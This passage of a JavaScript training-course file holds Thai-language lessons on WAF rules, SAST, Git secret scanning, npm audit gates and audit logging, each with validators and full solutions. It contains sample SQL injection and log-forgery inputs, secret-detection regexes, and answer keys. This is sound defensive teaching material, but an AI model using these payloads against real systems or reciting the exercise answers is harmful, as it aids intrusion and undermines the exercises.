    • <strong>Network Firewall (Layer 3/4):</strong> ตรวจดูแค่ IP และ Port (เช่น อนุญาตให้ Port 443 ผ่าน) แต่ไม่รู้ว่าสิ่งที่ส่งเข้ามาคืออะไร<br/>
    • <strong>WAF (Layer 7):</strong> ถอดรหัส SSL ตรวจสอบเนื้อหาใน HTTP Body, URL Query, Headers และ Cookies แบบเรียลไทม์ เพื่อสกัดกั้นการโจมตีระดับแอปพลิเคชัน เช่น SQLi, XSS, Path Traversal<br/><br/>
    ⚙️ <strong>Positive vs Negative Security Model:</strong><br/>
    • <strong>Negative Model (Signature-based):</strong> บล็อกสิ่งที่รู้ว่าเป็นอันตราย (เหมือน Antivirus) เช่น OWASP ModSecurity CRS ข้อเสีย: อาจเจอ Zero-day หรือเทคนิค Obfuscation Bypass<br/>
    • <strong>Positive Model (Whitelist-based):</strong> อนุญาตเฉพาะโครงสร้างข้อมูลที่ถูกต้องตาม Schema (เช่น ต้องเป็นตัวเลขไม่เกิน 10 หลัก) ปฏิเสธทุกอย่างที่เหลือ<br/><br/>
    🩹 <strong>Virtual Patching:</strong><br/>
    เมื่อมีช่องโหว่ Zero-day ปรากฏขึ้น ทีมพัฒนาอาจต้องใช้เวลาหลายวันในการแก้โค้ดและดีพลอย แต่ทีม Security สามารถเขียน <strong>WAF Rule เพื่อบล็อก Signature การโจมตีที่ขอบระบบได้ภายในไม่กี่นาที</strong> ซึ่งเรียกว่า <em>Virtual Patching</em><br/><br/>
    🎓 <strong>มุมมองข้อสอบ Cert (CompTIA Security+ SY0-701 Domain 3):</strong><br/>
    ข้อสอบมักถามว่า: <em>"เครื่องมือใดเหมาะที่สุดในการปกป้องเว็บเซิร์ฟเวอร์จากช่องโหว่ OWASP Top 10 โดยไม่ต้องแก้ไข Source Code?"</em> ➡️ คำตอบคือ <strong>WAF (Web Application Firewall)</strong>`,
    example: `const testReq = { url: '/search?q=1 UNION SELECT * FROM users', body: {} };
const res = inspectWAFRules(testReq);
// res => { blocked: true, ruleId: 'CRS-942-SQLI-DETECTED' }`,
    task: `จงเขียนฟังก์ชัน <code>inspectWAFRules(req)</code> เพื่อดักจับ Pattern การโจมตี SQL Injection และ XSS ใน Payload พร้อมส่งคืน <code>{ blocked: true, ruleId }</code> หากพบสิ่งแปลกปลอม`
  },

  // ==========================================
  // MODULE 5: DEVSECOPS, INCIDENT RESPONSE & OPERATIONS
  // ==========================================
  {
    id: "sast_semgrep_scanning",
    meta: "โมดูล 5: DevSecOps & Ops",
    title: "SAST (Static Application Security Testing): ตรวจจับ Insecure Code Patterns ใน CI/CD",
    template: `// สถานการณ์: สร้าง Static Analysis Linter จำลองการทำงานของเครื่องมือ SAST (เช่น Semgrep)
// SAST ช่วยค้นหาช่องโหว่ความปลอดภัยใน Source Code ตั้งแต่ช่วงแรกของ SDLC (Shift-Left)
// จงเขียนฟังก์ชัน runStaticAnalysisRule(sourceCode):
// 1. แยก sourceCode ออกเป็นแต่ละบรรทัด
// 2. วนลูปตรวจสอบโค้ดในแต่ละบรรทัดว่ามีการใช้งานฟังก์ชันอันตราย eval( หรือ new Function( หรือไม่
// 3. หากพบ ให้เก็บข้อมูล { line: lineNumber, rule: 'SECURITY-NO-DYNAMIC-EVAL', snippet: lineText.trim() }
// 4. คืนค่าเป็น Object: { passed: violations.length === 0, violations }
// WRITE YOUR CODE HERE
`,
    validate: (code, log) => {
      log("🔍 ตรวจสอบการทำงานของ SAST Rule Engine (Static Analysis Pattern Matching)...");
      const stripped = stripComments(code);
      const hasSplitLines = /\.split\(['"]\\n['"]\)/.test(stripped);
      const hasEvalCheck = /eval/i.test(stripped) && /Function/i.test(stripped);
      const hasRuleId = /SECURITY-NO-DYNAMIC-EVAL/.test(stripped);
      const hasPassedProperty = /passed\s*:\s*violations\.length\s*===?\s*0/.test(stripped);
      if (!hasSplitLines) {
        throw new Error("ไม่พบการแยกโค้ดออกเป็นบรรทัด (.split('\\n'))");
      }
      if (!hasEvalCheck) {
        throw new Error("ไม่พบการตรวจจับฟังก์ชันอันตราย eval( หรือ new Function(");
      }
      if (!hasRuleId || !hasPassedProperty) {
        throw new Error("ไม่พบการระบุ ruleId หรือการส่งคืนค่า { passed, violations }");
      }
      log("✓ ยืนยันได้ว่า SAST Engine ตรวจจับ Insecure Patterns ใน Source Code ได้อย่างถูกต้อง");
    },
    hint: "แยก const lines = sourceCode.split('\\n'); แล้ววนลูป lines.forEach((line, idx) => { if (/\\beval\\(|new\\s+Function\\(/.test(line)) violations.push({ line: idx + 1, rule: 'SECURITY-NO-DYNAMIC-EVAL', snippet: line.trim() }); }); return { passed: violations.length === 0, violations };",
    solution: `function runStaticAnalysisRule(sourceCode) {
  const lines = sourceCode.split('\\n');
  const violations = [];

  lines.forEach((line, index) => {
    if (/\\beval\\(|new\\s+Function\\(/.test(line)) {
      violations.push({
        line: index + 1,
        rule: 'SECURITY-NO-DYNAMIC-EVAL',
        snippet: line.trim()
      });
    }
  });

  return {
    passed: violations.length === 0,
    violations
  };
}`,
    theory: `🎯 <strong>เป้าหมาย (Goal):</strong> เข้าใจแนวคิด <strong>Shift-Left Security</strong> และการทำงานของ <strong>SAST (Static Application Security Testing)</strong><br/><br/>
    ⬅️ <strong>ทำไมต้อง Shift-Left Security:</strong><br/>
    ต้นทุนในการแก้ไขบั๊กความปลอดภัยจะสูงขึ้นเรื่อยๆ ตามขั้นตอนของ Software Lifecycle:<br/>
    • พบตอนเขียนโค้ด (IDE/Pre-commit): แก้ใน 5 นาที ต้นทุน $1<br/>
    • พบตอน CI Pipeline (SAST): แก้ใน 1 ชั่วโมง ต้นทุน $10<br/>
    • พบตอน Production (หลังแฮกเกอร์เจาะ): ต้นทุนนับล้านบาท ทั้งค่าปรับ ข้อมูลหลุด และเสียชื่อเสียง<br/><br/>
    🔍 <strong>SAST vs DAST:</strong><br/>
    • <strong>SAST (Static - White-Box):</strong> สแกน Source Code โดยตรงโดยไม่ต้องรันโปรแกรม เช่น Semgrep, SonarQube, CodeQL จุดเด่น: ชี้เลขบรรทัดที่มีปัญหาได้ทันที<br/>
    • <strong>DAST (Dynamic - Black-Box):</strong> ยิงทดสอบโปรแกรมที่กำลังทำงานจริงจากภายนอก เช่น OWASP ZAP จุดเด่น: ไม่จำกัดภาษา และทดสอบ Runtime Environment ได้จริง<br/><br/>
    🎓 <strong>มุมมองข้อสอบ Cert (CompTIA Security+ SY0-701 Domain 3):</strong><br/>
    ข้อสอบ Security+ มักถามเปรียบเทียบการทดสอบ: <strong>Static Analysis (SAST) คือการตรวจ Code ขณะพัก (At rest) แบบ White-box</strong> ส่วน <strong>Dynamic Analysis (DAST) คือการตรวจขณะโปรแกรมกำลังทำงาน (In execution) แบบ Black-box</strong>`,
    example: `const code = "const x = 1;\\neval(userInput);";
const audit = runStaticAnalysisRule(code);
// audit => { passed: false, violations: [{ line: 2, rule: 'SECURITY-NO-DYNAMIC-EVAL', ... }] }`,
    task: `จงเขียนฟังก์ชัน <code>runStaticAnalysisRule(sourceCode)</code> เพื่อแยกโค้ดเป็นบรรทัด ตรวจหา <code>eval(</code> หรือ <code>new Function(</code> และคืน <code>{ passed, violations }</code>`
  },
  {
    id: "secret_detection_git",
    meta: "โมดูล 5: DevSecOps & Ops",
    title: "Secret Detection in Git: ดักจับ API Keys และ Private Keys ใน Git Commits (TruffleHog/Gitleaks)",
    template: `// สถานการณ์: สร้าง Pre-commit Hook / CI Scanner จำลองการทำงานของ Gitleaks และ TruffleHog
// ป้องกันความผิดพลาดยอดฮิต: นักพัฒนาเผลอ Commit ไฟล์ Secret, Private Key หรือ API Key ขึ้น Git
// จงเขียนฟังก์ชัน scanForSecretsInDiff(commitDiff):
// 1. ตรวจสอบ Private Key: /-----BEGIN (?:RSA )?PRIVATE KEY-----/
// 2. ตรวจสอบ AWS Access Key ID: /\\bAKIA[0-9A-Z]{16}\\b/
// 3. หากพบ ให้เก็บประเภทที่พบลงในอาร์เรย์ detectedTypes
// 4. ส่งคืนผลลัพธ์เป็น Object: { hasSecrets: detectedTypes.length > 0, detectedTypes }
// WRITE YOUR CODE HERE
`,
    validate: (code, log) => {
      log("🔍 ตรวจสอบการสแกนหา Hardcoded Secrets และ Private Keys ใน Git Diffs...");
      const stripped = stripComments(code);
      const hasPrivateKeyRegex = /BEGIN.*PRIVATE KEY/.test(stripped);
      const hasAwsRegex = /AKIA/.test(stripped);
      const hasResultObject = /hasSecrets/.test(stripped) && /detectedTypes/.test(stripped);
      if (!hasPrivateKeyRegex) {
        throw new Error("ไม่พบ Regular Expression สำหรับตรวจจับ Private Key Block");
      }
      if (!hasAwsRegex) {
        throw new Error("ไม่พบ Regular Expression สำหรับตรวจจับ AWS Access Key (AKIA...)");
      }
      if (!hasResultObject) {
        throw new Error("ไม่พบการส่งคืนผลลัพธ์ { hasSecrets, detectedTypes }");
      }
      log("✓ ยืนยันได้ว่าตัวสแกนสามารถดักจับ Secrets ก่อนถูก Push ขึ้น Git Repository สำเร็จ");
    },
    hint: "สร้าง patterns array เก็บ regex ของ Private Key และ AWS Key วนลูปทดสอบกับ commitDiff ถ้า match ให้ push ชื่อเข้า detectedTypes แล้วคืน { hasSecrets: detectedTypes.length > 0, detectedTypes }",
    solution: `function scanForSecretsInDiff(commitDiff) {
  const patterns = [
    { name: 'Private Key', regex: /-----BEGIN (?:RSA )?PRIVATE KEY-----/ },
    { name: 'AWS Access Key', regex: /\\bAKIA[0-9A-Z]{16}\\b/ }
  ];

  const detectedTypes = [];
  for (const p of patterns) {
    if (p.regex.test(commitDiff)) {
      detectedTypes.push(p.name);
    }
  }

  return {
    hasSecrets: detectedTypes.length > 0,
    detectedTypes
  };
}`,
    theory: `🎯 <strong>เป้าหมาย (Goal):</strong> เข้าใจความเสี่ยงของ <strong>Secret Leakage ใน Git Repositories</strong> และการติดตั้ง <strong>Automated Secret Scanners</strong><br/><br/>
    💥 <strong>ทำไม Secret รั่วไหลใน Git ถึงอันตรายมหาศาล:</strong><br/>
    บอตของแฮกเกอร์จะคอยสแกน Public GitHub Commits แบบเรียลไทม์ หากมีคนเผลอ Commit AWS Access Key ขึ้นไป บอตจะตรวจพบภายในเวลาไม่ถึง 60 วินาที และนำ Key ไปสร้าง Cloud Instances ขนาดใหญ่เพื่อขุดเหรียญคริปโต หรือดูดฐานข้อมูลทั้งหมดทันที ก่อให้เกิดบิลค่าบริการคลาวด์หลายแสนบาทในชั่วข้ามคืน<br/><br/>
    🛡️ <strong>เครื่องมือตรวจจับ Secret (Gitleaks, TruffleHog):</strong><br/>
    • <strong>Regex Pattern Matching:</strong> ตรวจจับ Signature ที่มีรูปแบบตายตัว เช่น AWS Key (<code>AKIA...</code>), Stripe API Key (<code>sk_live_...</code>), GitHub Token (<code>ghp_...</code>)<br/>
    • <strong>Shannon Entropy:</strong> คำนวณความสุ่ม (Entropy) ของตัวอักษร หากพบสตริงยาวๆ ที่มีความสุ่มสูงผิดปกติ แม้ไม่ตรงกับ regex ระบบก็จะเตือนว่าเป็น Secret ที่ถูกสร้างขึ้นมา<br/><br/>
    🚨 <strong>หากเผลอ Push Secret ขึ้น Git ไปแล้ว ต้องทำอย่างไร:</strong><br/>
    1. <strong>Revoke & Rotate Key ทันที!</strong> (การลบ commit บน git ไม่ช่วยอะไร เพราะประวัติยังอยู่ใน git history และบอตอาจดูดไปแล้ว)<br/>
    2. ทำความสะอาดประวัติย้อนหลังด้วยเครื่องมือ <code>git-filter-repo</code> หรือ <code>BFG Repo-Cleaner</code><br/><br/>
    🎓 <strong>มุมมองข้อสอบ Cert (CompTIA Security+ SY0-701 Domain 3):</strong><br/>
    ข้อสอบ Security+ มักถามว่า: <em>"ขั้นตอนแรกที่สำคัญที่สุดเมื่อพบว่า Private Key รั่วไหลสู่สาธารณะคืออะไร?"</em> ➡️ คำตอบคือ <strong>Revoke (เพิกถอน) กุญแจนั้นทันที</strong>`,
    example: `const diff = "+ const awsKey = 'AKIAIOSFODNN7EXAMPLE';";
const res = scanForSecretsInDiff(diff);
// res => { hasSecrets: true, detectedTypes: ['AWS Access Key'] }`,
    task: `จงเขียนฟังก์ชัน <code>scanForSecretsInDiff(commitDiff)</code> เพื่อตรวจจับ Private Key Block และ AWS Access Key Pattern พร้อมคืน <code>{ hasSecrets, detectedTypes }</code>`
  },
  {
    id: "sca_dependency_sbom",
    meta: "โมดูล 5: DevSecOps & Ops",
    title: "Supply Chain Security: SCA, Dependency Vulnerabilities และ SBOM (CycloneDX)",
    template: `// สถานการณ์: สร้าง Security Gate ใน CI/CD ตรวจสอบ Dependency Vulnerabilities (SCA)
// โค้ดที่ทีมเขียนเองอาจปลอดภัย แต่ไลบรารีใน node_modules อาจมีช่องโหว่ (Supply Chain Risk)
// 1. นำเข้า { execSync } จาก 'node:child_process'
// 2. รันคำสั่ง 'npm audit --omit=dev --json' ด้วย execSync
//    (ใช้ try/catch ดักจับ error.stdout เพราะ npm audit จะ exit code != 0 เมื่อเจอช่องโหว่)
// 3. parse ผลลัพธ์ JSON แล้วตรวจสอบว่า report.metadata.vulnerabilities.critical ต้องเท่ากับ 0
// WRITE YOUR CODE HERE
`,
    validate: (code, log) => {
      log("🔍 ตรวจสอบการสร้าง Security Gate สำหรับ Software Composition Analysis (SCA)...");
      const stripped = stripComments(code);
      const hasExecSync = /execSync\(/.test(stripped);
      const hasAuditCmd = /npm audit/.test(stripped) && /--json/.test(stripped);
      const hasTryCatch = /try\s*{[\s\S]*}\s*catch/.test(stripped);
      const hasParse = /JSON\.parse\(/.test(stripped);
      const hasCriticalZero = /vulnerabilities\.critical\s*\)\.toBe\(0\)/.test(stripped);
      if (!hasExecSync || !hasAuditCmd) {
        throw new Error("ไม่พบการรันคำสั่ง npm audit --omit=dev --json ด้วย execSync");
      }
      if (!hasTryCatch) {
        throw new Error("ไม่พบการใช้ try/catch ดักจับ error.stdout (npm audit exit ด้วย error เสมอเมื่อเจอช่องโหว่)");
      }
      if (!hasParse || !hasCriticalZero) {
        throw new Error("ไม่พบการ parse JSON หรือการ assert ว่า vulnerabilities.critical ต้องเป็น 0");
      }
      log("✓ ยืนยันได้ว่า SCA Gate สามารถตรวจสอบ Dependency Vulnerabilities ใน CI/CD ได้ถูกต้อง");
    },
    hint: "ใช้ try { output = execSync('npm audit --omit=dev --json', { encoding: 'utf-8' }); } catch (err) { output = err.stdout; } const report = JSON.parse(output); expect(report.metadata.vulnerabilities.critical).toBe(0);",
    solution: `import { test, expect } from '@playwright/test';
import { execSync } from 'node:child_process';

test('Production dependencies ต้องไม่มี Critical Vulnerabilities', () => {
  let output;
  try {
    output = execSync('npm audit --omit=dev --json', { encoding: 'utf-8' });
  } catch (err) {
    output = err.stdout;
  }
  const report = JSON.parse(output);
  expect(report.metadata.vulnerabilities.critical).toBe(0);
});`,
    theory: `🎯 <strong>เป้าหมาย (Goal):</strong> เข้าใจความเสี่ยงของ <strong>Software Supply Chain Attacks</strong>, การทำ <strong>SCA (Software Composition Analysis)</strong> และมาตรฐาน <strong>SBOM (Software Bill of Materials)</strong><br/><br/>
    📦 <strong>Software Supply Chain Attack คืออะไร:</strong><br/>
    แอปพลิเคชันยุคใหม่ประกอบด้วยโค้ดของตัวเองเพียง 10-20% ส่วนที่เหลืออีก 80-90% คือ Open Source Dependencies (npm, pip, maven) หากแฮกเกอร์เจาะเข้าไปฝังโค้ดอันตรายในไลบรารียอดนิยมตัวเดียว (เช่น กรณี SolarWinds หรือ Log4Shell) ทุกระบบทั่วโลกที่ดาวน์โหลดไลบรารีนั้นไปใช้ก็จะติดมัลแวร์ตามไปด้วยทันที<br/><br/>
    📜 <strong>SBOM (Software Bill of Materials):</strong><br/>
    คือ <strong>"ฉลากโภชนาการ" ของซอฟต์แวร์</strong> ที่ระบุรายชื่อ ส่วนประกอบ ลิขสิทธิ์ และเวอร์ชันของทุกไลบรารีอย่างละเอียด มาตรฐานสากลที่นิยมใช้คือ <strong>CycloneDX</strong> และ <strong>SPDX</strong> ซึ่งช่วยให้ทีม Security สามารถตรวจสอบได้ทันทีเมื่อมีข่าวช่องโหว่ใหม่ว่าระบบเราใช้ไลบรารีที่มีปัญหาตัวนั้นหรือไม่<br/><br/>
    🎓 <strong>มุมมองข้อสอบ Cert (CompTIA Security+ SY0-701 Domain 3):</strong><br/>
    ข้อสอบ Security+ มักถามว่า: <em>"เอกสารประเภทใดช่วยให้องค์กรมองเห็นส่วนประกอบ Third-Party ทั้งหมดเพื่อจัดการความเสี่ยง Supply Chain?"</em> ➡️ คำตอบคือ <strong>Software Bill of Materials (SBOM)</strong>`,
    example: `// ตัวอย่างผลลัพธ์จาก npm audit --json
// "metadata": { "vulnerabilities": { "info": 0, "low": 2, "moderate": 1, "high": 0, "critical": 0 } }`,
    task: `จงเขียน Test ตรวจสอบ Dependency Vulnerabilities โดยรันคำสั่ง <code>npm audit --omit=dev --json</code> ผ่าน <code>execSync</code> และ assert ว่า <code>report.metadata.vulnerabilities.critical === 0</code>`
  },
  {
    id: "security_logging_forensics",
    meta: "โมดูล 5: DevSecOps & Ops",
    title: "Security Logging, SIEM & Incident Response (NIST SP 800-61)",
    template: `// สถานการณ์: สร้างฟังก์ชัน formatAuditLog(event) สำหรับระบบ SIEM และ Audit Trail
// กฎเหล็กของ Security Logging:
// 1. ต้องป้องกัน Log Injection: ตัดอักขระควบคุม (\\r, \\n) ออกจากข้อมูลทุก field
// 2. บันทึกองค์ประกอบสำคัญ: timestamp (ISO 8601), userId, action, status, ip
// 3. ส่งคืนผลลัพธ์เป็น JSON String เพื่อให้ระบบ SIEM นำไปวิเคราะห์ต่อได้
// จงเขียนฟังก์ชัน formatAuditLog({ userId, action, status, ip })
// WRITE YOUR CODE HERE
`,
    validate: (code, log) => {
      log("🔍 ตรวจสอบการทำ Security Logging และการป้องกัน Log Injection...");
      const stripped = stripComments(code);
      const hasSanitize = /replace\(.*[\\r\\n]/.test(stripped);
      const hasTimestamp = /toISOString\(\)|new Date/.test(stripped);
      const hasFields = ['userId', 'action', 'status', 'ip'].every(f => stripped.includes(f));
      const hasJsonStringify = /JSON\.stringify\(/.test(stripped);
      if (!hasSanitize) {
        throw new Error("ไม่พบการ sanitize อักขระ \\r และ \\n เพื่อป้องกันช่องโหว่ Log Injection");
      }
      if (!hasTimestamp) {
        throw new Error("ไม่พบการบันทึก timestamp ในรูปแบบมาตรฐาน ISO 8601");
      }
      if (!hasFields) {
        throw new Error("โครงสร้าง Log ขาด field สำคัญ (userId, action, status, ip)");
      }
      if (!hasJsonStringify) {
        throw new Error("ไม่พบการแปลง Log Object เป็น JSON String ผ่าน JSON.stringify()");
      }
      log("✓ ยืนยันได้ว่า Audit Log มีความปลอดภัย ปราศจาก Log Injection และพร้อมส่งต่อให้ SIEM");
    },
    hint: "สร้าง helper sanitize = (val) => String(val || '').replace(/[\\r\\n]/g, ''); จากนั้นสร้าง object { timestamp: new Date().toISOString(), userId: sanitize(userId), action: sanitize(action), status: sanitize(status), ip: sanitize(ip) } แล้ว JSON.stringify",
    solution: `function formatAuditLog({ userId, action, status, ip }) {
  const sanitize = (val) => String(val || '').replace(/[\\r\\n]/g, '');
  const entry = {
    timestamp: new Date().toISOString(),
    userId: sanitize(userId),
    action: sanitize(action),
    status: sanitize(status),
    ip: sanitize(ip)
  };
  return JSON.stringify(entry);
}`,
    theory: `🎯 <strong>เป้าหมาย (Goal):</strong> เข้าใจการทำ <strong>Security Logging & Monitoring</strong>, การทำงานร่วมกับ <strong>SIEM</strong> และขั้นตอน <strong>Incident Response ตามมาตรฐาน NIST SP 800-61</strong><br/><br/>
    🪵 <strong>ความสำคัญของ Security Logging (OWASP A09:2021):</strong><br/>
    ระบบที่ไม่เก็บบันทึก Log เปรียบเสมือนบ้านที่ติดสัญญาณกันขโมยแต่ไม่มีกล้องวงจรปิด เมื่อเกิดเหตุการณ์บุกรุก จะไม่สามารถระบุได้เลยว่าแฮกเกอร์เข้ามาทางไหน ขโมยอะไรไปบ้าง หรือยังแอบฝังตัวอยู่หรือไม่<br/><br/>
    💥 <strong>ช่องโหว่ Log Injection (Log Forgery):</strong><br/>
    หากนำข้อมูลจากผู้ใช้ (เช่น Username) ไปเขียนลง Log file โดยไม่กรอง ผู้โจมตีสามารถส่ง <code>admin\\r\\n[INFO] User logged in successfully</code> เพื่อสร้างบรรทัดใหม่ปลอมในไฟล์ Log หลอกลวงทีม Security ผู้ตรวจสอบได้ จึงต้องตัด <code>\\r</code> และ <code>\\n</code> ทิ้งเสมอ<br/><br/>
    🚨 <strong>วงจร Incident Response 6 ขั้นตอน (NIST SP 800-61 Rev. 2):</strong><br/>
    1. <strong>Preparation (เตรียมการ):</strong> จัดเตรียมคน นโยบาย อุปกรณ์ และฝึกซ้อมแผนเผชิญเหตุ<br/>
    2. <strong>Detection & Analysis (ตรวจจับและวิเคราะห์):</strong> เฝ้าระวังผ่าน SIEM ตรวจจับสิ่งผิดปกติ และยืนยันว่าเป็นภัยคุกคามจริง<br/>
    3. <strong>Containment (กักกันความเสียหาย):</strong> สกัดกั้นไม่ให้การโจมตีกระจายตัว (เช่น ตัดเครื่องออกจากระบบเครือข่าย, ระงับบัญชีที่โดนแฮก)<br/>
    4. <strong>Eradication (กำจัดต้นตอ):</strong> กำจัดมัลแวร์ ปิดบัญชีปลอม และอัปเดต Patch ปิดช่องโหว่<br/>
    5. <strong>Recovery (ฟื้นฟูระบบ):</strong> กู้คืนระบบจาก Backup ที่ปลอดภัย นำกลับมาให้บริการ และเฝ้าระวังอย่างใกล้ชิด<br/>
    6. <strong>Post-Incident Activity (ถอดบทเรียน):</strong> สรุปสิ่งที่เกิดขึ้น (Post-Mortem) เพื่อนำมาปรับปรุงระบบป้องกันในอนาคต<br/><br/>
    🎓 <strong>มุมมองข้อสอบ Cert (CompTIA Security+ SY0-701 Domain 4 & CySA+):</strong><br/>
    ข้อสอบ Security+ แทบทุกรอบจะถามเรียงลำดับขั้นตอน Incident Response: <strong>Preparation ➡️ Detection & Analysis ➡️ Containment ➡️ Eradication ➡️ Recovery ➡️ Lessons Learned</strong>`,
    example: `const logStr = formatAuditLog({ userId: 'u123', action: 'PASSWORD_RESET', status: 'SUCCESS', ip: '203.0.113.19' });
// logStr => '{"timestamp":"...","userId":"u123","action":"PASSWORD_RESET","status":"SUCCESS","ip":"203.0.113.19"}'`,
    task: `จงเขียนฟังก์ชัน <code>formatAuditLog({ userId, action, status, ip })</code> เพื่อ sanitize อักขระ <code>\\r</code> และ <code>\\n</code> ป้องกัน Log Injection พร้อมบันทึก <code>timestamp</code> เป็น ISO 8601 และส่งคืนเป็น JSON String`
  }
];

// Application state
const PREFIX = 'sec';
const TAB_WIDTH = 2;

// Migration map from legacy 13 lesson IDs (pre-v0.14.0) to new 26 lesson IDs
// Preserves completed checkmarks and saved code for learners from older course versions
const LEGACY_ID_MIGRATIONS = {
  'intro': 'cia_triad_zero_trust',
  'injection_awareness': 'sqli_union_blind',
  'xss_input_sanitization': 'xss_stored_reflected_dom',
  'auth_bypass': 'auth_bypass_prevention',
  'security_headers': 'security_headers_hardening',
  'advanced_stack_trace_leak': 'sensitive_data_exposure',
  'advanced_auth_coverage': 'auth_bypass_prevention',
  'cors_reflected_origin': 'cors_misconfiguration',
  'rate_limit_verification': 'rate_limiting_dos_defense',
  'insecure_cookie_flags': 'session_management_cookies',
  'idor_awareness': 'broken_access_control_idor',
  'npm_audit_gate': 'sca_dependency_sbom'
};

function migrateLegacyProgress() {
  if (typeof localStorage === 'undefined') return;
  try {
    for (const [oldId, newId] of Object.entries(LEGACY_ID_MIGRATIONS)) {
      const oldCompletedKey = `${PREFIX}_course_completed_${oldId}`;
      const newCompletedKey = `${PREFIX}_course_completed_${newId}`;
      if (localStorage.getItem(oldCompletedKey) === 'true' && !localStorage.getItem(newCompletedKey)) {
        localStorage.setItem(newCompletedKey, 'true');
      }
      const oldCodeKey = `${PREFIX}_sandbox_code_${oldId}`;
      const newCodeKey = `${PREFIX}_sandbox_code_${newId}`;
      const oldCode = localStorage.getItem(oldCodeKey);
      if (oldCode && !localStorage.getItem(newCodeKey)) {
        localStorage.setItem(newCodeKey, oldCode);
      }
    }
  } catch (e) {
    // Non-blocking in headless/restricted storage environments
  }
}
migrateLegacyProgress();

function runSandboxCode() {
  const lesson = LESSONS[currentLessonIndex];
  const textarea = document.getElementById('editor-textarea');
  const terminal = document.getElementById('terminal-body');
  const nextLessonBtn = document.getElementById('next-lesson-btn');
  const overlay = document.getElementById('lesson-overlay');

  if (!textarea || !terminal || !nextLessonBtn || !overlay) return;

  const userCode = textarea.value;
  localStorage.setItem(PREFIX + '_sandbox_code_' + lesson.id, userCode);

  terminal.innerHTML = '<div class="terminal-line info">npx playwright test ' + lesson.id + '.spec.ts --project=security</div>' +
    '<div class="terminal-line text-muted">...................................................</div>';

  setTimeout(() => {
    const outputs = [];
    const log = (msg) => {
      outputs.push('<div class="terminal-line success">' + msg + '</div>');
      terminal.innerHTML += '<div class="terminal-line success">' + msg + '</div>';
      terminal.scrollTop = terminal.scrollHeight;
    };

    try {
      lesson.validate(userCode, log);

      terminal.innerHTML += '<div class="terminal-line text-muted">...................................................</div>' +
        '<div class="terminal-line success">✓ <strong>ผลการรัน: สำเร็จ (Passed)</strong></div>' +
        '<div class="terminal-line success">1 passed (102ms)</div>';

      setLessonCompleted(lesson.id);

      setTimeout(() => {
        overlay.classList.add('show');

        if (currentLessonIndex < LESSONS.length - 1) {
          nextLessonBtn.innerText = 'เรียนรู้บทเรียนถัดไป →';
          nextLessonBtn.onclick = () => {
            overlay.classList.remove('show');
            selectLesson(currentLessonIndex + 1);
          };
        } else {
          nextLessonBtn.innerText = '🏆 จบหลักสูตรแล้ว! ทบทวนความรู้';
          nextLessonBtn.onclick = () => {
            overlay.classList.remove('show');
            showGraduationMessage();
          };
        }
      }, 1000);

    } catch (err) {
      terminal.innerHTML += '<div class="terminal-line text-muted">...................................................</div>' +
        '<div class="terminal-line error">✕ <strong>ผลการรัน: ล้มเหลว (Failed)</strong></div>' +
        '<div class="terminal-line error">' + escapeHtml(err.message).replace(/\n/g, '<br/>') + '</div>' +
        '<div class="terminal-line error">1 failed (41ms)</div>';
    }
    terminal.scrollTop = terminal.scrollHeight;
  }, 600);
}

function showGraduationMessage() {
  const terminal = document.getElementById('terminal-body');
  if (!terminal) return;

  let totalCorrect = LESSONS.filter(l => isLessonCompleted(l.id)).length;

  terminal.innerHTML = '<div class="terminal-line info">===================================================</div>' +
    '<div class="terminal-line success">🎉 ขอแสดงความยินดี! คุณเรียนจบหลักสูตร Application Security & Cyber Defense แล้ว!</div>' +
    '<div class="terminal-line success">สำเร็จครบทั้งหมด: ' + totalCorrect + ' จาก ' + LESSONS.length + ' บทเรียน</div>' +
    '<div class="terminal-line info">===================================================</div>' +
    '<div class="terminal-line text-muted">คุณมีความรู้ความเข้าใจครอบคลุมทั้งมาตรฐาน CompTIA Security+ (SY0-701) และทักษะปฏิบัติการ AppSec / OWASP Top 10 สากล พร้อมสำหรับการสอบใบรับรองและเติบโตในสายงาน Cybersecurity!</div>';
  terminal.scrollTop = terminal.scrollHeight;
  showTrackCertificate('Application Security & Cyber Defense');
}

window.PREFIX = PREFIX;
window.TAB_WIDTH = TAB_WIDTH;
window.LESSONS = LESSONS;
window.runSandboxCode = runSandboxCode;
window.showGraduationMessage = showGraduationMessage;
window.QA_TRACKS = window.QA_TRACKS || {};
window.QA_TRACKS['security-testing'] = {
  id: 'security-testing',
  title: 'Application Security & Cyber Defense',
  folder: 'Security-Testing',
  lessons: LESSONS
};
})();
